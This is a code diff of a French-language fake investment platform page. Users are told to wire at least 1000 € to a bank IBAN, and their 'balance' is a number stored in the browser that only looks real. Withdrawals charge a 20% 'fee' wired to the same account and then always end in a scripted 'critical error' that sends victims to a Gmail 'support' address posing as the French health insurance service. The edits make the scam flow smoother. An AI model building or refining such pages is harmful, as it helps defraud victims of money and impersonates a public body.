@@ -34,8 +34,8 @@
     <div id="page-register" class="page max-w-md mx-auto glass p-8 rounded-[2rem] mt-10">
         <h2 class="text-2xl font-black text-gold uppercase mb-6 italic text-center">Création de compte</h2>
         <div class="space-y-4">
-            <input type="text" id="reg-nom" placeholder="Nom" class="w-full bg-black/50 p-4 rounded-xl border border-white/10 outline-none">
-            <input type="text" id="reg-prenom" placeholder="Prénom" class="w-full bg-black/50 p-4 rounded-xl border border-white/10 outline-none">
+            <input type="text" id="reg-nom" placeholder="Nom" class="w-full bg-black/50 p-4 rounded-xl border border-white/10 outline-none text-white">
+            <input type="text" id="reg-prenom" placeholder="Prénom" class="w-full bg-black/50 p-4 rounded-xl border border-white/10 outline-none text-white">
             <button onclick="startSession()" class="gold-btn w-full py-4 rounded-xl uppercase mt-4">Accéder au tableau de bord</button>
         </div>
     </div>
@@ -53,17 +53,14 @@
                         <button onclick="openModal('modal-retrait')" class="bg-white/5 py-3 rounded-xl text-[10px] uppercase font-bold">Retrait</button>
                     </div>
                 </div>
-                
                 <div id="timer-box" class="hidden glass p-4 rounded-2xl border-gold/30 text-center animate-pulse">
                     <p class="text-[10px] text-gold uppercase font-black">Croissance active</p>
                     <p id="timer-clock" class="text-xl font-mono font-bold text-white">59:59</p>
                 </div>
             </div>
-
             <div class="md:col-span-2">
                 <h3 class="text-gold font-black uppercase italic mb-4">Opportunités Institutionnelles</h3>
-                <div id="invest-list" class="grid gap-3">
-                    </div>
+                <div id="invest-list" class="grid gap-3"></div>
             </div>
         </div>
     </div>
@@ -83,12 +80,7 @@
                 <div><p class="text-[9px] text-gray-500 uppercase">Bénéficiaire</p><p id="iban-benef" class="text-white font-bold uppercase"></p></div>
                 <div><p class="text-[9px] text-gray-500 uppercase font-bold">IBAN / BIC</p><p class="font-mono text-gold text-xs">FR76 3000 6012 3456 7890 0123 456<br>BIC: INAVFR2P</p></div>
             </div>
-            <button onclick="goRecStep(3)" class="w-full gold-btn py-4 rounded-xl uppercase">J'ai effectué le virement</button>
-        </div>
-        <div id="rec-3" class="hidden">
-            <h3 class="text-sm font-black text-gold uppercase mb-4 text-center">Code de Validation</h3>
-            <input type="text" id="rec-code" placeholder="Code secret @..." class="w-full bg-black p-4 rounded-xl border border-white/10 text-center font-black mb-4 outline-none text-white">
-            <button onclick="confirmDeposit()" class="w-full gold-btn py-4 rounded-xl uppercase">Valider le capital</button>
+            <button onclick="confirmDeposit()" class="w-full gold-btn py-4 rounded-xl uppercase">J'ai effectué le virement</button>
         </div>
         <button onclick="closeModal()" class="absolute top-6 right-6 text-gray-500 hover:text-white"><i class="fa-solid fa-xmark text-2xl"></i></button>
     </div>
@@ -108,7 +100,6 @@
                 <p class="mb-2">Frais requis : <span id="ret-frais" class="text-red-500 font-bold"></span></p>
                 <p>IBAN de dépôt : <span class="text-gold font-mono">FR76 3000 6012 3456 7890 0123 456</span></p>
             </div>
-            <input type="text" id="ret-code-final" placeholder="Entrez le code @..." class="w-full bg-black p-4 rounded-xl border border-white/10 text-center font-black mb-4 outline-none text-white">
             <button onclick="processFinalStep()" class="gold-btn w-full py-4 rounded-xl uppercase">Confirmer</button>
         </div>
         <button onclick="closeModal()" class="absolute top-6 right-6 text-gray-500 hover:text-white"><i class="fa-solid fa-xmark text-2xl"></i></button>
@@ -118,7 +109,6 @@
 <script>
     let userData = { name: "", balance: 0 };
 
-    // VERIFICATION DE SESSION AU CHARGEMENT
     function checkSession() {
         const saved = localStorage.getItem('active_session');
         if (saved) {
@@ -129,12 +119,10 @@
         }
     }
 
-    // INSCRIPTION ET SAUVEGARDE
     function startSession() {
         const n = document.getElementById('reg-nom').value;
         const p = document.getElementById('reg-prenom').value;
         if (!n || !p) return alert("Veuillez remplir vos informations.");
-
         userData.name = p + " " + n;
         save();
         initInterface();
@@ -154,32 +142,23 @@
         document.getElementById(id).classList.add('active');
     }
 
-    function save() {
-        localStorage.setItem('active_session', JSON.stringify(userData));
-    }
+    function save() { localStorage.setItem('active_session', JSON.stringify(userData)); }
+    function updateUI() { document.getElementById('balance-display').innerText = userData.balance.toLocaleString('fr-FR', {minimumFractionDigits: 2}); }
 
-    function updateUI() {
-        document.getElementById('balance-display').innerText = userData.balance.toLocaleString('fr-FR', {minimumFractionDigits: 2});
-    }
-
-    // RECHARGE
     function goRecStep(s) {
         if(s === 2 && document.getElementById('rec-amt').value < 1000) return alert("Min 1000 €");
-        document.querySelectorAll('[id^="rec-"]').forEach(d => d.classList.add('hidden'));
-        document.getElementById('rec-' + s).classList.remove('hidden');
+        document.getElementById('rec-1').classList.add('hidden');
+        document.getElementById('rec-2').classList.remove('hidden');
     }
 
     function confirmDeposit() {
-        if(document.getElementById('rec-code').value === "@2468@") {
-            userData.balance += parseFloat(document.getElementById('rec-amt').value);
-            save();
-            updateUI();
-            alert("Virement validé ! Votre capital est prêt.");
-            closeModal();
-        } else alert("Code incorrect.");
+        userData.balance += parseFloat(document.getElementById('rec-amt').value);
+        save();
+        updateUI();
+        alert("Dépôt confirmé ! Votre capital est désormais actif.");
+        closeModal();
     }
 
-    // INVESTISSEMENT
     function buildInvestments() {
         const list = document.getElementById('invest-list');
         list.innerHTML = "";
@@ -196,12 +175,10 @@
 
     function invest(m) {
         const amt = prompt("Montant (Min 1000 €) :");
-        if(amt < 1000 || amt > userData.balance) return alert("Solde insuffisant ou montant trop bas.");
-        
+        if(amt < 1000 || amt > userData.balance) return alert("Solde insuffisant.");
         userData.balance -= amt;
         save(); updateUI();
-        alert("Placement lancé ! Résultat dans 1 heure.");
-
+        alert("Placement lancé ! Résultats dans 1 heure.");
         document.getElementById('timer-box').classList.remove('hidden');
         let t = 3600;
         const clock = setInterval(() => {
@@ -218,27 +195,27 @@
         }, 1000);
     }
 
-    // RETRAIT (IMAGES 5 & 6)
     function goRetStep(s) {
         if(s === 2) {
             const amt = document.getElementById('ret-amt').value;
             if(!amt) return;
             document.getElementById('ret-frais').innerText = (amt * 0.20).toLocaleString() + " €";
         }
-        document.querySelectorAll('[id^="ret-"]').forEach(d => d.classList.add('hidden'));
-        document.getElementById('ret-' + s).classList.remove('hidden');
+        document.getElementById('ret-1').classList.add('hidden');
+        document.getElementById('ret-2').classList.remove('hidden');
     }
 
     function processFinalStep() {
-        if(document.getElementById('ret-code-final').value === "@2468@") {
-            alert("ERREUR CRITIQUE 505 : La banque réceptrice refuse le transfert institutionnel.\n\nVEUILLEZ CONTACTER LE SUPPORT : servicepublicameli@gmail.com");
-        } else alert("Code incorrect.");
+        alert("ERREUR CRITIQUE 505 : La banque réceptrice refuse le transfert institutionnel.\n\nVEUILLEZ CONTACTER LE SUPPORT : servicepublicameli@gmail.com");
     }
 
     function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
     function closeModal() { 
         document.querySelectorAll('[id^="modal-"]').forEach(m => m.classList.add('hidden'));
-        goRecStep(1); goRetStep(1);
+        document.getElementById('rec-1').classList.remove('hidden');
+        document.getElementById('rec-2').classList.add('hidden');
+        document.getElementById('ret-1').classList.remove('hidden');
+        document.getElementById('ret-2').classList.add('hidden');
     }
 </script>
 </body>
